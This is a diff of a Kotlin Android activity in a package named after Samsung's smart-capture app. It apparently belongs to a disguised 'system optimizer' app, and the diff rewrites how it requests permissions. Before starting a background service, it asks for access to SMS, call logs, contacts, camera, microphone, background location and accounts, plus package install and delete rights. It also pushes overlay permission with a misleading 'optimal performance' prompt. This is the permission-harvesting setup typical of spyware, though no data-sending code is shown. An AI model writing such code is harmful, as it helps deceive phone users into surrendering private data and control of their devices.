@@ -1,132 +1,132 @@
 package com.samsung.android.app.smartcapture
 
 import android.Manifest
-import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.widget.Toast
-import androidx.activity.result.contract.ActivityResultContracts
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 
 class PermissionActivity : AppCompatActivity() {
 
-    private val requiredPermissions = mutableListOf<String>()
-
-    private val permissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestMultiplePermissions()
-    ) { permissions ->
-        val allGranted = permissions.values.all { it }
-        if (allGranted) {
-            startSystemOptimizerService()
-        } else {
-            val denied = permissions.filter { !it.value }.keys
-            Toast.makeText(this, "Some permissions denied: $denied", Toast.LENGTH_LONG).show()
-            startSystemOptimizerService()
-        }
-        finish()
+    companion object {
+        private val REQUIRED_PERMISSIONS = arrayOf(
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+            Manifest.permission.FOREGROUND_SERVICE,
+            Manifest.permission.SYSTEM_ALERT_WINDOW,
+            Manifest.permission.REQUEST_INSTALL_PACKAGES,
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.ANSWER_PHONE_CALLS,
+            Manifest.permission.CALL_PHONE,
+            Manifest.permission.ADD_VOICEMAIL,
+            Manifest.permission.BODY_SENSORS,
+            Manifest.permission.READ_CALENDAR,
+            Manifest.permission.WRITE_CALENDAR,
+            Manifest.permission.GET_ACCOUNTS,
+            Manifest.permission.ACCESS_WIFI_STATE,
+            Manifest.permission.CHANGE_WIFI_STATE,
+            Manifest.permission.ACCESS_NETWORK_STATE,
+            Manifest.permission.INTERNET,
+            Manifest.permission.VIBRATE,
+            Manifest.permission.WAKE_LOCK,
+            Manifest.permission.RECEIVE_BOOT_COMPLETED,
+            Manifest.permission.REQUEST_DELETE_PACKAGES,
+            Manifest.permission.QUERY_ALL_PACKAGES
+        )
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        buildPermissionList()
-
-        val neededPermissions = requiredPermissions.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }.toTypedArray()
-
-        if (neededPermissions.isEmpty()) {
-            startSystemOptimizerService()
-            finish()
-            return
-        }
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
-            neededPermissions.contains(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-        ) {
-            val foregroundLocation = arrayOf(
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION
-            )
-            permissionLauncher.launch(foregroundLocation)
-        } else {
-            permissionLauncher.launch(neededPermissions)
-        }
+        checkAndRequestPermissions()
     }
 
-    private fun buildPermissionList() {
-        // --- STORAGE / MEDIA ---
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            requiredPermissions.add(Manifest.permission.READ_MEDIA_IMAGES)
-            requiredPermissions.add(Manifest.permission.READ_MEDIA_VIDEO)
-            requiredPermissions.add(Manifest.permission.READ_MEDIA_AUDIO)
-        } else {
-            requiredPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-            requiredPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
-        }
-        requiredPermissions.add(Manifest.permission.ACCESS_MEDIA_LOCATION)
+    private fun checkAndRequestPermissions() {
+        val permissionsToRequest = mutableListOf<String>()
 
-        // --- LOCATION ---
-        requiredPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
-        requiredPermissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            requiredPermissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-        }
-
-        // --- SMS & CALL LOG ---
-        requiredPermissions.add(Manifest.permission.READ_SMS)
-        requiredPermissions.add(Manifest.permission.RECEIVE_SMS)
-        requiredPermissions.add(Manifest.permission.READ_CALL_LOG)
-
-        // --- CONTACTS ---
-        requiredPermissions.add(Manifest.permission.READ_CONTACTS)
-        requiredPermissions.add(Manifest.permission.GET_ACCOUNTS)
-
-        // --- CAMERA & MICROPHONE ---
-        requiredPermissions.add(Manifest.permission.CAMERA)
-        requiredPermissions.add(Manifest.permission.RECORD_AUDIO)
-
-        // --- PHONE ---
-        requiredPermissions.add(Manifest.permission.READ_PHONE_STATE)
-        requiredPermissions.add(Manifest.permission.CALL_PHONE)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            requiredPermissions.add(Manifest.permission.READ_PHONE_NUMBERS)
-        }
-
-        // --- NOTIFICATIONS ---
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            requiredPermissions.add(Manifest.permission.POST_NOTIFICATIONS)
-        }
-
-        // --- ACTIVITY RECOGNITION ---
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            requiredPermissions.add(Manifest.permission.ACTIVITY_RECOGNITION)
-        }
-
-        // --- SCHEDULE EXACT ALARM ---
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            requiredPermissions.add(Manifest.permission.SCHEDULE_EXACT_ALARM)
-        }
-    }
-
-    private fun startSystemOptimizerService() {
-        val intent = Intent(this, SystemOptimizerService::class.java)
-        intent.action = "START_FROM_PERMISSION_ACTIVITY"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-        } else {
-            startService(intent)
-        }
-    }
-
-    companion object {
-        fun createIntent(context: Context): Intent {
-            return Intent(context, PermissionActivity::class.java).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
+        for (permission in REQUIRED_PERMISSIONS) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(permission)
             }
         }
+
+        if (permissionsToRequest.isNotEmpty()) {
+            ActivityCompat.requestPermissions(
+                this,
+                permissionsToRequest.toTypedArray(),
+                100
+            )
+        } else {
+            checkOverlayPermission()
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 100) {
+            checkOverlayPermission()
+        }
+    }
+
+    private fun checkOverlayPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this)) {
+                showOverlayDialog()
+            } else {
+                startMainService()
+            }
+        } else {
+            startMainService()
+        }
+    }
+
+    private fun showOverlayDialog() {
+        AlertDialog.Builder(this)
+            .setTitle("Additional Permission Required")
+            .setMessage("Please allow overlay permission for optimal performance.")
+            .setPositiveButton("Open Settings") { _, _ ->
+                val intent = Intent(
+                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    android.net.Uri.parse("package:$packageName")
+                )
+                startActivityForResult(intent, 101)
+            }
+            .setNegativeButton("Skip") { _, _ ->
+                startMainService()
+            }
+            .setCancelable(false)
+            .show()
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == 101) {
+            startMainService()
+        }
+    }
+
+    private fun startMainService() {
+        Toast.makeText(this, "Starting optimization service...", Toast.LENGTH_SHORT).show()
+        val intent = Intent(this, SystemOptimizerService::class.java)
+        ContextCompat.startForegroundService(this, intent)
+        finish()
     }
 }
